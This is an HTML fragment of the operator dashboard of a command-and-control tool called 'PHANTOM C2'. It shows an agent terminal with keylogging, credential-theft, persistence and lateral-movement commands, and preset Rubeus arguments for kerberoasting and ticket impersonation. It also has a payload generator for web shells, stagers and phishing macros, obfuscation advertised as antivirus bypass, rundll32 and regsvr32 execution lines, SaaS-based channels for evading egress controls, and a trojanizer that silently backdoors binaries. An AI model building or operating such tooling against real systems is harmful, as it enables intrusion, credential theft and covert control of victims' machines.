          <div class="term-info" style="color:var(--accent-light);font-weight:700;font-size:14px;letter-spacing:0.5px">
            ╔══════════════════════════════════════════════════════════╗
          </div>
          <div class="term-info" style="color:var(--accent-light);font-weight:700;font-size:14px">
            ║&nbsp;&nbsp;PHANTOM C2 — Interactive Terminal&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;║
          </div>
          <div class="term-info" style="color:var(--accent-light);font-weight:700;font-size:14px;letter-spacing:0.5px">
            ╚══════════════════════════════════════════════════════════╝
          </div>
          <div class="term-info" style="margin-top:8px;color:var(--text-muted)">Select an agent above to begin. Type <span style="color:var(--cyan)">help</span> for all commands.</div>
          <div>&nbsp;</div>
          <div class="term-info" style="color:var(--green)">⚡ Quick Commands</div>
          <div class="term-info" style="color:var(--text-muted);font-size:12px;line-height:1.8">
            <span style="color:var(--cyan)">shell</span> &lt;cmd&gt; &nbsp;│&nbsp; <span style="color:var(--cyan)">sysinfo</span> &nbsp;│&nbsp; <span style="color:var(--cyan)">ifconfig</span> &nbsp;│&nbsp; <span style="color:var(--cyan)">ps</span> &nbsp;│&nbsp; <span style="color:var(--cyan)">screenshot</span> &nbsp;│&nbsp; <span style="color:var(--cyan)">download</span> &lt;path&gt;
          </div>
          <div class="term-info" style="color:var(--text-muted);font-size:12px;line-height:1.8">
            <span style="color:var(--cyan)">upload</span> &nbsp;│&nbsp; <span style="color:var(--cyan)">persist</span> &nbsp;│&nbsp; <span style="color:var(--cyan)">sleep</span> &nbsp;│&nbsp; <span style="color:var(--cyan)">token</span> &nbsp;│&nbsp; <span style="color:var(--cyan)">keylog</span> &nbsp;│&nbsp; <span style="color:var(--cyan)">creds</span> &nbsp;│&nbsp; <span style="color:var(--cyan)">evasion</span>
          </div>
          <div class="term-info" style="color:var(--text-muted);font-size:12px;line-height:1.8">
            <span style="color:var(--cyan)">socks</span> start/stop/list &nbsp;│&nbsp; <span style="color:var(--cyan)">portfwd</span> &nbsp;│&nbsp; <span style="color:var(--cyan)">pivot</span> &nbsp;│&nbsp; <span style="color:var(--cyan)">lateral</span> &nbsp;│&nbsp; <span style="color:var(--cyan)">ad-*</span> (22 AD cmds)
          </div>
          <div>&nbsp;</div>
        </div>
        <div class="term-input-row">
          <span class="term-prompt" id="term-prompt">phantom &gt;</span>
          <input class="term-input" id="term-input" placeholder="Type a command..." onkeydown="if(event.key==='Enter')sendTermCmd()" autofocus>
        </div>
      </div>

      <!-- .NET Assembly + Upload + Pivot -->
      <div style="display:grid;grid-template-columns:1fr 1fr 1fr;gap:14px;margin-top:14px">

        <!-- .NET Assembly -->
        <div class="card" style="border-top:2px solid rgba(234,179,8,0.5)">
          <div class="card-header" style="display:flex;align-items:center;justify-content:space-between">
            <h3 style="margin:0;display:flex;align-items:center;gap:8px"><span>⚡</span> .NET Assembly</h3>
            <span style="font-size:10px;font-weight:700;padding:2px 8px;border-radius:10px;background:rgba(234,179,8,0.12);color:#ca8a04;border:1px solid rgba(234,179,8,0.3)">IN-MEMORY</span>
          </div>
          <div class="card-body padded">
            <!-- File + path -->
            <div style="margin-bottom:10px">
              <label style="display:block;font-size:10px;color:var(--text-muted);text-transform:uppercase;letter-spacing:1px;margin-bottom:4px">Assembly File (.exe / .dll)</label>
              <input type="file" id="term-asm-file" accept=".exe,.dll" style="width:100%;padding:7px 10px;background:var(--bg-input);border:1px solid var(--border);border-radius:var(--radius);color:var(--text-primary);font-size:12px;box-sizing:border-box">
            </div>
            <div style="margin-bottom:10px">
              <label style="display:block;font-size:10px;color:var(--text-muted);text-transform:uppercase;letter-spacing:1px;margin-bottom:4px">Stage Path (remote)</label>
              <input id="term-asm-path" placeholder="C:\Windows\Temp\" style="width:100%;padding:7px 10px;background:var(--bg-input);border:1px solid var(--border);border-radius:var(--radius);color:var(--text-primary);font-size:12px;font-family:monospace;box-sizing:border-box">
            </div>
            <!-- Tool tabs -->
            <div style="margin-bottom:8px">
              <label style="display:block;font-size:10px;color:var(--text-muted);text-transform:uppercase;letter-spacing:1px;margin-bottom:6px">Quick Args</label>
              <div style="display:flex;gap:4px;margin-bottom:8px;flex-wrap:wrap">
                <button onclick="asmTab('seatbelt')" id="asmt-seatbelt" style="padding:4px 10px;font-size:11px;border-radius:4px;border:1px solid rgba(234,179,8,0.5);background:rgba(234,179,8,0.15);color:#ca8a04;cursor:pointer;font-weight:600">Seatbelt</button>
                <button onclick="asmTab('rubeus')" id="asmt-rubeus" style="padding:4px 10px;font-size:11px;border-radius:4px;border:1px solid var(--border);background:var(--bg-input);color:var(--text-muted);cursor:pointer">Rubeus</button>
                <button onclick="asmTab('sharphound')" id="asmt-sharphound" style="padding:4px 10px;font-size:11px;border-radius:4px;border:1px solid var(--border);background:var(--bg-input);color:var(--text-muted);cursor:pointer">SharpHound</button>
                <button onclick="asmTab('misc')" id="asmt-misc" style="padding:4px 10px;font-size:11px;border-radius:4px;border:1px solid var(--border);background:var(--bg-input);color:var(--text-muted);cursor:pointer">Other</button>
              </div>
              <div id="asmq-seatbelt" style="display:flex;flex-wrap:wrap;gap:4px">
                <button class="qbtn" onclick="setAsmArg('-group=all')">-group=all</button>
                <button class="qbtn" onclick="setAsmArg('-group=user')">-group=user</button>
                <button class="qbtn" onclick="setAsmArg('-group=system')">-group=system</button>
                <button class="qbtn" onclick="setAsmArg('-group=misc')">-group=misc</button>
                <button class="qbtn" onclick="setAsmArg('CredEnum')">CredEnum</button>
                <button class="qbtn" onclick="setAsmArg('DotNet')">DotNet</button>
              </div>
              <div id="asmq-rubeus" style="display:none;flex-wrap:wrap;gap:4px">
                <button class="qbtn" onclick="setAsmArg('kerberoast')">kerberoast</button>
                <button class="qbtn" onclick="setAsmArg('asreproast')">asreproast</button>
                <button class="qbtn" onclick="setAsmArg('triage')">triage</button>
                <button class="qbtn" onclick="setAsmArg('klist')">klist</button>
                <button class="qbtn" onclick="setAsmArg('dump')">dump</button>
                <button class="qbtn" onclick="setAsmArg('monitor /interval:5')">monitor</button>
                <button class="qbtn" onclick="setAsmArg('hash /password:Password123!')">hash</button>
                <button class="qbtn" onclick="setAsmArg('s4u /user:USER /rc4:HASH /impersonateuser:administrator /msdsspn:cifs/TARGET /ptt')">s4u /ptt</button>
              </div>
              <div id="asmq-sharphound" style="display:none;flex-wrap:wrap;gap:4px">
                <button class="qbtn" onclick="setAsmArg('-c All')">-c All</button>
                <button class="qbtn" onclick="setAsmArg('-c DCOnly')">DCOnly</button>
                <button class="qbtn" onclick="setAsmArg('find /vulnerable')">Certify vuln</button>
                <button class="qbtn" onclick="setAsmArg('cas')">Certify cas</button>
                <button class="qbtn" onclick="setAsmArg('audit')">SharpUp audit</button>
                <button class="qbtn" onclick="setAsmArg('all')">SharpUp all</button>
              </div>
              <div id="asmq-misc" style="display:none;flex-wrap:wrap;gap:4px">
                <button class="qbtn" onclick="setAsmArg('triage')">DPAPI triage</button>
                <button class="qbtn" onclick="setAsmArg('masterkeys')">DPAPI masterkeys</button>
                <button class="qbtn" onclick="setAsmArg('logins')">Chrome logins</button>
                <button class="qbtn" onclick="setAsmArg('cookies')">Chrome cookies</button>
                <button class="qbtn" onclick="setAsmArg('Get-DomainUser')">Get-DomainUser</button>
                <button class="qbtn" onclick="setAsmArg('Get-DomainComputer')">Get-DomainComputer</button>
                <button class="qbtn" onclick="setAsmArg('Find-DomainShare')">Find-DomainShare</button>
              </div>
            </div>
            <!-- Args + run -->
            <div style="display:flex;gap:6px;margin-top:10px;align-items:center">
              <input id="term-asm-args" placeholder="Arguments..." style="flex:1;padding:8px 10px;background:var(--bg-input);border:1px solid var(--border);border-radius:var(--radius);color:var(--text-primary);font-size:12px;font-family:monospace">
              <button onclick="termExecuteAssembly()" style="padding:8px 16px;font-size:12px;font-weight:700;background:linear-gradient(135deg,rgba(234,179,8,0.7),rgba(245,158,11,0.7));border:none;border-radius:var(--radius);color:#fff;cursor:pointer;white-space:nowrap">⚡ Run</button>
            </div>
          </div>
        </div>

        <!-- Upload File to Agent -->
        <div class="card" style="border-top:2px solid rgba(99,102,241,0.5)">
          <div class="card-header" style="display:flex;align-items:center;justify-content:space-between">
            <h3 style="margin:0;display:flex;align-items:center;gap:8px"><span>📤</span> Upload to Agent</h3>
            <span id="upload-status-badge" style="font-size:10px;font-weight:700;padding:2px 8px;border-radius:10px;background:rgba(99,102,241,0.12);color:var(--purple);border:1px solid rgba(99,102,241,0.3)">READY</span>
          </div>
          <div class="card-body padded">
            <!-- Drop zone -->
            <div id="upload-dropzone" onclick="document.getElementById('term-upload-file').click()" ondragover="event.preventDefault();this.style.borderColor='var(--purple)'" ondragleave="this.style.borderColor='var(--border)'" ondrop="uploadDropHandler(event)" style="border:2px dashed var(--border);border-radius:8px;padding:20px;text-align:center;cursor:pointer;margin-bottom:12px;transition:border-color .2s">
              <div style="font-size:24px;margin-bottom:6px">📁</div>
              <div id="upload-drop-label" style="font-size:12px;color:var(--text-muted)">Drop file here or <span style="color:var(--purple)">click to browse</span></div>
              <input type="file" id="term-upload-file" onchange="uploadFileSelected()" style="display:none">
            </div>
            <!-- Remote path -->
            <div style="margin-bottom:10px">
              <label style="display:block;font-size:10px;color:var(--text-muted);text-transform:uppercase;letter-spacing:1px;margin-bottom:4px">Remote Destination</label>
              <input id="term-upload-path" placeholder="C:\Users\Public\update.exe" style="width:100%;padding:8px 10px;background:var(--bg-input);border:1px solid var(--border);border-radius:var(--radius);color:var(--text-primary);font-size:12px;font-family:monospace;box-sizing:border-box">
            </div>
            <!-- Quick paths -->
            <div style="margin-bottom:12px">
              <label style="display:block;font-size:10px;color:var(--text-muted);text-transform:uppercase;letter-spacing:1px;margin-bottom:5px">Quick Paths</label>
              <div style="display:flex;flex-wrap:wrap;gap:4px">
                <button class="qbtn" onclick="setUploadPath('C:\\Windows\\Temp\\')">%TEMP%</button>
                <button class="qbtn" onclick="setUploadPath('C:\\Users\\Public\\')">Public</button>
                <button class="qbtn" onclick="setUploadPath('C:\\ProgramData\\')">ProgramData</button>
                <button class="qbtn" onclick="setUploadPath('/tmp/')">/tmp</button>
                <button class="qbtn" onclick="setUploadPath('/dev/shm/')">/dev/shm</button>
              </div>
            </div>
            <button onclick="termUploadFile()" style="width:100%;padding:10px;font-size:13px;font-weight:700;background:linear-gradient(135deg,rgba(99,102,241,0.8),rgba(139,92,246,0.8));border:none;border-radius:var(--radius);color:#fff;cursor:pointer">
              📤 &nbsp;Upload File
            </button>
            <div id="upload-result" style="margin-top:10px;font-size:12px;font-family:monospace"></div>
          </div>
        </div>

        <!-- Pivot Control -->
        <div class="card" style="border-top:2px solid rgba(34,197,94,0.5)">
          <div class="card-header" style="display:flex;align-items:center;justify-content:space-between">
            <h3 style="margin:0;display:flex;align-items:center;gap:8px"><span>🔗</span> Pivot Control</h3>
            <span id="pivot-status-badge" style="font-size:10px;font-weight:700;padding:2px 8px;border-radius:10px;background:rgba(100,100,100,0.12);color:var(--text-muted);border:1px solid var(--border)">IDLE</span>
          </div>
          <div class="card-body padded">
            <!-- Mode tabs -->
            <div style="display:flex;gap:0;margin-bottom:14px;border:1px solid var(--border);border-radius:6px;overflow:hidden">
              <button id="pivot-tab-smb" onclick="pivotTab('smb')" style="flex:1;padding:8px;font-size:12px;font-weight:600;border:none;cursor:pointer;background:rgba(34,197,94,0.15);color:#16a34a;border-right:1px solid var(--border)">🪟 SMB Pipe</button>
              <button id="pivot-tab-tcp" onclick="pivotTab('tcp')" style="flex:1;padding:8px;font-size:12px;font-weight:600;border:none;cursor:pointer;background:var(--bg-input);color:var(--text-muted)">🌐 TCP Relay</button>
            </div>

            <!-- SMB panel -->
            <div id="pivot-panel-smb">
              <div style="padding:8px 10px;background:rgba(34,197,94,0.06);border:1px solid rgba(34,197,94,0.2);border-radius:6px;font-size:11px;color:var(--text-muted);margin-bottom:12px">
                Internal agents connect via <span style="color:var(--cyan);font-family:monospace">\\host\pipe\&lt;name&gt;</span> — Windows only
              </div>
              <div style="margin-bottom:10px">
                <label style="display:block;font-size:10px;color:var(--text-muted);text-transform:uppercase;letter-spacing:1px;margin-bottom:4px">Pipe Name</label>
                <input id="pivot-pipe-name" value="msupdate" style="width:100%;padding:8px 10px;background:var(--bg-input);border:1px solid var(--border);border-radius:var(--radius);color:var(--text-primary);font-size:12px;font-family:monospace;box-sizing:border-box">
              </div>
              <div style="display:flex;gap:6px">
                <button onclick="sendPivotCmd('start')" style="flex:1;padding:8px;font-size:12px;font-weight:600;background:rgba(34,197,94,0.15);border:1px solid rgba(34,197,94,0.4);border-radius:var(--radius);color:#16a34a;cursor:pointer">▶ Start</button>
                <button onclick="sendPivotCmd('stop')" style="flex:1;padding:8px;font-size:12px;font-weight:600;background:rgba(239,68,68,0.1);border:1px solid rgba(239,68,68,0.3);border-radius:var(--radius);color:#ef4444;cursor:pointer">■ Stop</button>
                <button onclick="sendPivotCmd('list')" class="qbtn" style="flex:1;padding:8px;font-size:12px">≡ List</button>
              </div>
            </div>

            <!-- TCP panel -->
            <div id="pivot-panel-tcp" style="display:none">
              <div style="padding:8px 10px;background:rgba(99,102,241,0.06);border:1px solid rgba(99,102,241,0.2);border-radius:6px;font-size:11px;color:var(--text-muted);margin-bottom:12px">
                Binds a TCP port on the agent — works on Linux and Windows
              </div>
              <div style="margin-bottom:10px">
                <label style="display:block;font-size:10px;color:var(--text-muted);text-transform:uppercase;letter-spacing:1px;margin-bottom:4px">Bind Address (port or host:port)</label>
                <input id="pivot-tcp-addr" value="4444" style="width:100%;padding:8px 10px;background:var(--bg-input);border:1px solid var(--border);border-radius:var(--radius);color:var(--text-primary);font-size:12px;font-family:monospace;box-sizing:border-box">
              </div>
              <div style="display:flex;gap:6px">
                <button onclick="sendTCPPivotCmd('tcp-start')" style="flex:1;padding:8px;font-size:12px;font-weight:600;background:rgba(34,197,94,0.15);border:1px solid rgba(34,197,94,0.4);border-radius:var(--radius);color:#16a34a;cursor:pointer">▶ Start</button>
                <button onclick="sendTCPPivotCmd('tcp-stop')" style="flex:1;padding:8px;font-size:12px;font-weight:600;background:rgba(239,68,68,0.1);border:1px solid rgba(239,68,68,0.3);border-radius:var(--radius);color:#ef4444;cursor:pointer">■ Stop</button>
                <button onclick="sendTCPPivotCmd('tcp-list')" class="qbtn" style="flex:1;padding:8px;font-size:12px">≡ List</button>
              </div>
            </div>

            <div id="pivot-result" style="margin-top:12px;font-size:12px;font-family:monospace;color:var(--green);white-space:pre-wrap;min-height:24px;padding:6px 0"></div>
          </div>
        </div>

        <!-- ExC2 Channels -->
        <div class="card" style="border-top:2px solid rgba(56,189,248,0.5)">
          <div class="card-header" style="display:flex;align-items:center;justify-content:space-between">
            <h3 style="margin:0;display:flex;align-items:center;gap:8px"><span>📡</span> ExC2 Channels</h3>
            <span id="exchannel-status-badge" style="font-size:10px;font-weight:700;padding:2px 8px;border-radius:10px;background:rgba(100,100,100,0.12);color:var(--text-muted);border:1px solid var(--border)">INACTIVE</span>
          </div>
          <div class="card-body padded">
            <p style="font-size:12px;color:var(--text-muted);margin-bottom:12px">Route C2 traffic through SaaS platforms to bypass egress controls.</p>

            <!-- Channel selector cards -->
            <div style="display:grid;grid-template-columns:1fr 1fr 1fr;gap:6px;margin-bottom:14px">
              <label id="exc-card-slack" onclick="selectExChannel('slack')" style="display:flex;flex-direction:column;align-items:center;gap:4px;padding:10px 6px;border:2px solid rgba(56,189,248,0.5);border-radius:8px;cursor:pointer;background:rgba(56,189,248,0.08);text-align:center">
                <span style="font-size:20px">💬</span>
                <span style="font-size:11px;font-weight:600;color:#0ea5e9">Slack</span>
                <input type="radio" name="exchannel-radio" value="slack" checked style="display:none">
              </label>
              <label id="exc-card-teams" onclick="selectExChannel('teams')" style="display:flex;flex-direction:column;align-items:center;gap:4px;padding:10px 6px;border:1px solid var(--border);border-radius:8px;cursor:pointer;background:var(--bg-input);text-align:center">
                <span style="font-size:20px">🟦</span>
                <span style="font-size:11px;font-weight:600;color:var(--text-muted)">Teams</span>
                <input type="radio" name="exchannel-radio" value="teams" style="display:none">
              </label>
              <label id="exc-card-gist" onclick="selectExChannel('gist')" style="display:flex;flex-direction:column;align-items:center;gap:4px;padding:10px 6px;border:1px solid var(--border);border-radius:8px;cursor:pointer;background:var(--bg-input);text-align:center">
                <span style="font-size:20px">🐙</span>
                <span style="font-size:11px;font-weight:600;color:var(--text-muted)">Gist</span>
                <input type="radio" name="exchannel-radio" value="gist" style="display:none">
              </label>
            </div>

            <!-- Hidden select kept for JS compatibility -->
            <select id="exchannel-name" style="display:none">
              <option value="slack">Slack</option>
              <option value="teams">Microsoft Teams</option>
              <option value="gist">GitHub Gist</option>
            </select>

            <!-- Token field -->
            <div style="margin-bottom:14px">
              <label style="display:block;font-size:10px;color:var(--text-muted);text-transform:uppercase;letter-spacing:1px;margin-bottom:4px">API Token / Webhook</label>
              <input id="exchannel-token" type="password" placeholder="xoxb-... or webhook URL" style="width:100%;padding:8px 10px;background:var(--bg-input);border:1px solid var(--border);border-radius:var(--radius);color:var(--text-primary);font-size:12px;font-family:monospace;box-sizing:border-box">
            </div>

            <!-- Controls -->
            <div style="display:flex;gap:6px;margin-bottom:12px">
              <button onclick="sendExChannelCmd('start')" style="flex:1;padding:9px;font-size:12px;font-weight:600;background:rgba(34,197,94,0.15);border:1px solid rgba(34,197,94,0.4);border-radius:var(--radius);color:#16a34a;cursor:pointer">▶ Start</button>
              <button onclick="sendExChannelCmd('stop')" style="flex:1;padding:9px;font-size:12px;font-weight:600;background:rgba(239,68,68,0.1);border:1px solid rgba(239,68,68,0.3);border-radius:var(--radius);color:#ef4444;cursor:pointer">■ Stop</button>
              <button onclick="loadExChannels()" class="qbtn" style="flex:1;padding:9px;font-size:12px">≡ List</button>
            </div>

            <div id="exchannel-result" style="font-size:12px;font-family:monospace;color:var(--green);white-space:pre-wrap;min-height:24px"></div>
          </div>
        </div>
      </div>
    </div>

    <!-- ══════ PAYLOADS ══════ -->
    <div id="p-payloads" class="page">

      <!-- Stats bar -->
      <div class="stats-grid" style="grid-template-columns:repeat(5,1fr);margin-bottom:20px">
        <div class="stat-card purple"><div class="stat-label">Agent Binaries</div><div class="stat-value purple" style="font-size:26px">6</div><div class="stat-sub">Win · Linux · macOS · DLL</div></div>
        <div class="stat-card blue"><div class="stat-label">Web Shells</div><div class="stat-value blue" style="font-size:26px">3</div><div class="stat-sub">ASPX · PHP · JSP</div></div>
        <div class="stat-card green"><div class="stat-label">Stagers</div><div class="stat-value green" style="font-size:26px">3</div><div class="stat-sub">PS · Bash · Python</div></div>
        <div class="stat-card yellow"><div class="stat-label">Phishing</div><div class="stat-value yellow" style="font-size:26px">2</div><div class="stat-sub">HTA · VBA Macro</div></div>
        <div class="stat-card purple"><div class="stat-label">Mobile</div><div class="stat-value purple" style="font-size:26px">3+</div><div class="stat-sub">APK · iOS · 30 templates</div></div>
      </div>

      <!-- Generator -->
      <div class="card" style="border-top:2px solid var(--violet)">
        <div class="card-header" style="display:flex;align-items:center;justify-content:space-between">
          <h3 style="margin:0;display:flex;align-items:center;gap:8px"><span>🔧</span> Payload Generator</h3>
          <span id="pl-selected-badge" style="font-size:11px;font-weight:700;padding:3px 10px;border-radius:10px;background:var(--violet-dim);color:var(--violet-light);border:1px solid rgba(124,58,237,0.3)">No type selected</span>
        </div>
        <div class="card-body padded">
          <div style="display:grid;grid-template-columns:1fr 340px;gap:20px">

            <!-- Left: Type selector + config -->
            <div>
              <!-- Category tabs -->
              <div style="display:flex;gap:4px;margin-bottom:14px;border-bottom:1px solid var(--border);padding-bottom:12px">
                <button onclick="plCategory('agent')" id="plcat-agent" class="pl-cat-btn pl-cat-active">⚡ Agent Binaries</button>
                <button onclick="plCategory('shell')" id="plcat-shell" class="pl-cat-btn">🌐 Web Shells</button>
                <button onclick="plCategory('stager')" id="plcat-stager" class="pl-cat-btn">💻 Stagers</button>
                <button onclick="plCategory('phishing')" id="plcat-phishing" class="pl-cat-btn">📧 Phishing</button>
                <button onclick="plCategory('mobile')" id="plcat-mobile" class="pl-cat-btn">📱 Mobile</button>
                <button onclick="plCategory('shellcode')" id="plcat-shellcode" class="pl-cat-btn">💉 Shellcode</button>
              </div>

              <!-- Payload type cards -->
              <div id="pl-type-cards" style="display:grid;grid-template-columns:repeat(3,1fr);gap:8px;margin-bottom:16px"></div>

              <!-- Hidden select kept for JS compat -->
              <select id="pl-type" style="display:none" onchange="onPayloadTypeChange()">
                <option value="exe">exe</option><option value="exe-garble">exe-garble</option>
                <option value="dll">dll</option><option value="elf">elf</option>
                <option value="elf-garble">elf-garble</option><option value="darwin">darwin</option>
                <option value="aspx">aspx</option><option value="php">php</option>
                <option value="jsp">jsp</option><option value="powershell">powershell</option>
                <option value="bash">bash</option><option value="python">python</option>
                <option value="hta">hta</option><option value="vba">vba</option>
                <option value="shellcode">shellcode</option><option value="android">android</option>
                <option value="ios">ios</option><option value="app">app</option>
              </select>

              <!-- Listener -->
              <div style="margin-bottom:12px">
                <label style="display:block;font-size:10px;color:var(--text-muted);text-transform:uppercase;letter-spacing:1px;margin-bottom:5px">Listener (Callback)</label>
                <select id="pl-listener-select" onchange="onListenerSelect()" style="width:100%;padding:9px 12px;background:var(--bg-input);border:1px solid var(--border);border-radius:var(--radius);color:var(--text-primary);font-size:12px;margin-bottom:6px">
                  <option value="">-- Select active listener --</option>
                </select>
                <input type="text" id="pl-url" placeholder="https://your-domain.com" style="width:100%;padding:9px 12px;background:var(--bg-input);border:1px solid var(--border);border-radius:var(--radius);color:var(--text-primary);font-size:12px;font-family:monospace;box-sizing:border-box">
              </div>

              <!-- Sleep + Jitter -->
              <div style="display:grid;grid-template-columns:1fr 1fr;gap:10px;margin-bottom:12px">
                <div>
                  <label style="display:block;font-size:10px;color:var(--text-muted);text-transform:uppercase;letter-spacing:1px;margin-bottom:5px">Sleep (seconds)</label>
                  <input type="number" id="pl-sleep" value="10" min="1" style="width:100%;padding:9px 12px;background:var(--bg-input);border:1px solid var(--border);border-radius:var(--radius);color:var(--text-primary);font-size:13px">
                </div>
                <div>
                  <label style="display:block;font-size:10px;color:var(--text-muted);text-transform:uppercase;letter-spacing:1px;margin-bottom:5px">Jitter (%)</label>
                  <input type="number" id="pl-jitter" value="20" min="0" max="50" style="width:100%;padding:9px 12px;background:var(--bg-input);border:1px solid var(--border);border-radius:var(--radius);color:var(--text-primary);font-size:13px">
                </div>
              </div>

              <!-- App template (hidden) -->
              <div id="pl-app-row" style="margin-bottom:12px;display:none">
                <label style="display:block;font-size:10px;color:var(--text-muted);text-transform:uppercase;letter-spacing:1px;margin-bottom:5px">App Template</label>
                <select id="pl-app-template" style="width:100%;padding:9px 12px;background:var(--bg-input);border:1px solid var(--border);border-radius:var(--radius);color:var(--text-primary);font-size:12px">
                  <option value="">Loading templates...</option>
                </select>
              </div>

              <!-- Obfuscation -->
              <div style="margin-bottom:14px">
                <label style="display:block;font-size:10px;color:var(--text-muted);text-transform:uppercase;letter-spacing:1px;margin-bottom:8px">Obfuscation</label>
                <div style="display:grid;grid-template-columns:1fr 1fr 1fr;gap:6px">
                  <label id="obf-none" onclick="selectObf('none')" style="display:flex;flex-direction:column;align-items:center;gap:4px;padding:10px 6px;border:2px solid var(--violet);border-radius:8px;cursor:pointer;background:var(--violet-dim);text-align:center">
                    <span style="font-size:18px">🚫</span>
                    <span style="font-size:11px;font-weight:700;color:var(--violet-light)">None</span>
                    <span style="font-size:9px;color:var(--text-muted)">fastest build</span>
                    <input type="radio" name="pl-obfuscation" value="none" checked style="display:none">
                  </label>
                  <label id="obf-strip" onclick="selectObf('strip')" style="display:flex;flex-direction:column;align-items:center;gap:4px;padding:10px 6px;border:1px solid var(--border);border-radius:8px;cursor:pointer;background:var(--bg-input);text-align:center">
                    <span style="font-size:18px">✂️</span>
                    <span style="font-size:11px;font-weight:700;color:var(--text-muted)">Strip</span>
                    <span style="font-size:9px;color:var(--text-muted)">-s -w, ~60% size</span>
                    <input type="radio" name="pl-obfuscation" value="strip" style="display:none">
                  </label>
                  <label id="obf-garble" onclick="selectObf('garble')" style="display:flex;flex-direction:column;align-items:center;gap:4px;padding:10px 6px;border:1px solid var(--border);border-radius:8px;cursor:pointer;background:var(--bg-input);text-align:center">
                    <span style="font-size:18px">🛡️</span>
                    <span style="font-size:11px;font-weight:700;color:var(--text-muted)">Garble</span>
                    <span style="font-size:9px;color:var(--text-muted)">full AV bypass</span>
                    <input type="radio" name="pl-obfuscation" value="garble" style="display:none">
                  </label>
                </div>
              </div>

              <!-- DLL hint -->
              <div id="pl-dll-hint" style="display:none;margin-bottom:12px;padding:10px 14px;background:var(--cyan-dim);border:1px solid rgba(6,182,212,0.3);border-radius:8px;font-size:12px">
                <div style="color:var(--cyan);font-weight:700;margin-bottom:6px">📦 DLL Execution Methods</div>
                <div style="font-family:monospace;font-size:11px;line-height:2;color:var(--text-secondary)">
                  rundll32.exe phantom.dll,Start<br>
                  regsvr32 /s /i phantom.dll<br>
                  regsvr32 phantom.dll
                </div>
              </div>
            </div>

            <!-- Right: Output panel -->
            <div style="display:flex;flex-direction:column;gap:10px">
              <!-- Generate button -->
              <button onclick="generatePayload()" id="pl-btn" style="width:100%;padding:14px;font-size:14px;font-weight:700;background:linear-gradient(135deg,var(--violet),rgba(99,102,241,0.9));border:none;border-radius:var(--radius);color:#fff;cursor:pointer;letter-spacing:0.5px;transition:opacity .15s" onmouseover="this.style.opacity='.85'" onmouseout="this.style.opacity='1'">
                ⚡ &nbsp;Generate Payload
              </button>

              <!-- Output -->
              <div id="pl-output" style="flex:1;background:var(--bg-primary);border:1px solid var(--border);border-radius:var(--radius-lg);min-height:320px;overflow:hidden">
                <div style="display:flex;flex-direction:column;align-items:center;justify-content:center;height:320px;gap:10px;color:var(--text-muted)">
                  <div style="font-size:48px;opacity:0.15">⚡</div>
                  <div style="font-size:13px;font-weight:600">Select a payload type</div>
                  <div style="font-size:11px;opacity:.7">Output appears here after generation</div>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>

      <!-- Backdoor Generator -->
      <div style="display:grid;grid-template-columns:1fr 1fr;gap:14px;margin-top:14px">
        <div class="card" style="border-top:2px solid rgba(139,92,246,0.5);">
          <div class="card-header" style="border-bottom:1px solid var(--border);padding-bottom:12px;">
            <h3 style="margin:0;display:flex;align-items:center;gap:8px;"><span>💉</span> Binary Backdoor
              <span style="font-size:10px;font-weight:400;color:var(--text-muted);margin-left:auto;text-transform:uppercase;letter-spacing:1px;">Trojanizer</span>
            </h3>
            <p style="font-size:11px;color:var(--text-muted);margin:6px 0 0 0;">Original app runs normally · Agent calls back silently · Icon preserved</p>
          </div>
          <div class="card-body padded">

            <!-- Step 1: Target Binary -->
            <div style="margin-bottom:14px;">
              <div style="display:flex;align-items:center;gap:8px;margin-bottom:8px;">
                <span style="background:rgba(139,92,246,0.2);color:#a78bfa;border-radius:50%;width:20px;height:20px;display:flex;align-items:center;justify-content:center;font-size:11px;font-weight:700;flex-shrink:0;">1</span>
                <span style="font-size:11px;color:var(--text-muted);text-transform:uppercase;letter-spacing:1px;font-weight:600;">Select Target Binary</span>
              </div>
              <div style="display:flex;gap:6px;margin-bottom:6px;">
                <select id="bd-binary-select" onchange="onBinarySelect()" style="flex:1;padding:9px 12px;background:var(--bg-input);border:1px solid var(--border);border-radius:var(--radius);color:var(--text-primary);font-size:13px;">
                  <option value="">— Choose uploaded binary —</option>
                </select>
                <label style="display:inline-flex;align-items:center;gap:5px;background:var(--bg-input);border:1px solid var(--border);border-radius:var(--radius);padding:0 12px;cursor:pointer;font-size:12px;color:var(--accent-light);white-space:nowrap;font-weight:600;" title="Upload binary to server">
                  ⬆ Upload
                  <input type="file" id="bd-upload-file" onchange="uploadBinary()" style="display:none;" accept=".exe,.elf,.bin,.so,.dll">
                </label>
              </div>
              <input type="text" id="bd-input" placeholder="or enter server path: /tmp/app.exe" style="width:100%;padding:7px 10px;background:var(--bg-input);border:1px solid var(--border);border-radius:var(--radius);color:var(--text-muted);font-size:11px;font-family:monospace;box-sizing:border-box;">
            </div>

            <!-- Step 2: Listener -->
            <div style="margin-bottom:14px;">
              <div style="display:flex;align-items:center;gap:8px;margin-bottom:8px;">
                <span style="background:rgba(139,92,246,0.2);color:#a78bfa;border-radius:50%;width:20px;height:20px;display:flex;align-items:center;justify-content:center;font-size:11px;font-weight:700;flex-shrink:0;">2</span>
                <span style="font-size:11px;color:var(--text-muted);text-transform:uppercase;letter-spacing:1px;font-weight:600;">Callback Listener</span>
              </div>
              <select id="bd-listener" style="width:100%;padding:9px 12px;background:var(--bg-input);border:1px solid var(--border);border-radius:var(--radius);color:var(--text-primary);font-size:13px;margin-bottom:6px;box-sizing:border-box;">
                <option value="">— Select listener —</option>
              </select>
              <input type="text" id="bd-url" placeholder="http://YOUR_C2_IP:8080" style="width:100%;padding:7px 10px;background:var(--bg-input);border:1px solid var(--border);border-radius:var(--radius);color:var(--text-primary);font-size:12px;font-family:monospace;box-sizing:border-box;">
            </div>

            <!-- Step 3: Options -->
            <div style="margin-bottom:14px;">
              <div style="display:flex;align-items:center;gap:8px;margin-bottom:8px;">
                <span style="background:rgba(139,92,246,0.2);color:#a78bfa;border-radius:50%;width:20px;height:20px;display:flex;align-items:center;justify-content:center;font-size:11px;font-weight:700;flex-shrink:0;">3</span>
                <span style="font-size:11px;color:var(--text-muted);text-transform:uppercase;letter-spacing:1px;font-weight:600;">Options</span>
              </div>
              <div style="display:grid;grid-template-columns:1fr 1fr;gap:8px;">
